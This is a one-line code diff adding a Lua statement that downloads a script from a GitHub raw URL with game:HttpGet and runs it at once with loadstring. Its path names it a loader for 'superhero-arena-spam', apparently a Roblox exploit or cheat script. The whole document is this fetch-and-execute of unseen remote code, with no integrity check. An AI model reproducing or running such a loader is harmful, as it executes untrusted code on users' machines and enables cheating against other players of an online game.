@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/horneldersever24/loaders/main/loaders/superhero-arena-spam3-33oai5h2ocouho.lua"))()
